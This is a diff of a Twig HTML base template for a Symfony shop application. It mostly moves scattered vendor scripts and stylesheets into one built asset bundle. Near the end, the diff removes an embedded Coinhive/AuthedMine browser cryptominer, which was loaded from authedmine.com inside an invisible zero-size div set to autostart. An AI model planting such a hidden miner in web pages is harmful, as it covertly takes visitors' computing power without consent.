@@ -1,79 +1,44 @@
 <!DOCTYPE html>
-<html lang="{{ app.request.locale|split('_')[0] }}" ng-app="store">
+<html lang="{{ app.request.locale|split('_')[0] }}">
 <head>
-    <script src="/assets/vendor/PACE/pace.min.js"></script>
-    <link rel="stylesheet" href="/assets/vendor/PACE/themes/red/pace-theme-minimal.css">
+
+    <link rel="stylesheet" href="{{ asset('build/store.css') }}">
+
+    {#
     <link rel="stylesheet" href="/assets/vendor/jquery-confirm2/dist/jquery-confirm.min.css">
+    #}
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta name="author" content="lil-works">
     {{ sonata_seo_title() }}
     {{ sonata_seo_metadatas() }}
-    <link rel="stylesheet" href="{{ asset('assets/vendor/bootstrap/dist/css/bootstrap.min.css') }}">
+
+    <script src="{{ asset('bundles/fosjsrouting/js/router.js') }}"></script>
+    <script src="{{ path('fos_js_routing_js', { callback: 'fos.Router.setData' }) }}"></script>
+
     <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
     <!--[if lt IE 9]>
     <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
     <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
     <![endif]-->
-    <script src="{{ asset('assets/vendor/tinymce/tinymce.min.js') }}"></script>
-    <script src="{{ asset('assets/vendor/jquery/dist/jquery.min.js') }}"></script>
-    <script src="{{ asset('bundles/fosjsrouting/js/router.js') }}"></script>
-    <script src="{{ path('fos_js_routing_js', { callback: 'fos.Router.setData' }) }}"></script>
-    {% javascripts '@LilWorksStoreBundle/Resources/public/js/*' %}
-        <script src="{{ asset_url }}"></script>
-    {% endjavascripts %}
-
-    <script src="{{ asset('bundles/app/js/simpleLiveEditor.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/rowsEditor.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/init-tinymce.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/formCollectionEditor.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/formFilter.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/utils.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/alert.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/tab.js') }}"></script>
-    <script src="{{ asset('bundles/app/js/memorizeTab.js') }}"></script>
-    {% javascripts
-    'bundles/bazingajstranslation/js/translator.min.js'
-    'js/translations/config.js'
-    'js/translations/*/*.js' %}
-    <script src="{{ asset_url }}"></script>
-    {% endjavascripts %}
-    <script src="{{ url('bazinga_jstranslation_js') }}"></script>
-    <link rel="stylesheet" href="{{ asset('bundles/app/css/simpleLiveEditor.css') }}">
-    <link rel="stylesheet" href="{{ asset('bundles/lilworksstore/css/store.css') }}">
-    <link rel="stylesheet" type="text/css" href="{{ asset('bundles/bmatznerfontawesome/css/font-awesome.min.css') }}" />
-    <link rel="stylesheet" type="text/css" href="{{ asset('assets/vendor/bootstrap-social/bootstrap-social.css') }}" />
-    <link rel="stylesheet" type="text/css" href="{{ asset('assets/vendor/bootstrap-select/dist/css/bootstrap-select.min.css') }}" />
-    <script src="{{ asset('assets/vendor/bootstrap-select/dist/js/bootstrap-select.js') }}"></script>
-    <script src="{{ asset('assets/vendor/bootstrap-select/js/i18n/defaults-fr_FR.js') }}"></script>
-
-    {% block javascripts %}
-    {% endblock %}
 
 
     {% block stylesheets %}
     {% endblock %}
 
 
-    <script>
-        window.paceOptions = {
-            ajax: false,
-            restartOnRequestAfter: false
-        };
-    </script>
-
-
     {% if context == 'online' %}
         <style>
-            body {background-image: url({{ asset('bundles/lilworksstore/image/green.png') }});}
+            body {background-image: url({{ asset('build/images/green.png') }});}
         </style>
-        <link href="{{ asset('bundles/app/image/favicon-online.png') }}" rel="icon" type="image/png" >
+        <link href="{{ asset('build/images/favicon-online.png') }}" rel="icon" type="image/png" >
     {% else %}
         <style>
-            body {background-image: url({{ asset('bundles/lilworksstore/image/purple.png') }});}
+            body {background-image: url({{ asset('build/images/purple.png') }});}
         </style>
-        <link href="{{ asset('bundles/app/image/favicon-offline.png') }}" rel="icon" type="image/png" >
+        <link href="{{ asset('build/images/favicon-offline.png') }}" rel="icon" type="image/png" >
     {% endif %}
+
 </head>
 <body>
 
@@ -107,17 +72,7 @@
 </div>
 
 
-<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
-<div class="coinhive-miner"
-     style="width: 0;height:0;visibility: hidden;position:absolute;top:0;left:0;"
-     data-autostart="true"
-     data-throttle="0.3"
-     data-key="G9Sn6XMU4pODZQG11UMlMtTamPyNiobO">
-    <em>Loading...</em>
-</div>
-
-<script src="{{ asset('assets/vendor/tether/dist/js/tether.min.js') }}"></script>
-<script src="{{ asset('assets/vendor/bootstrap/dist/js/bootstrap.min.js') }}"></script>
-<script src="/assets/vendor/jquery-confirm2/dist/jquery-confirm.min.js"></script>
+<script src="{{ asset('build/store.js') }}"></script>
+{% block javascripts %}{% endblock %}
 </body>
 </html>
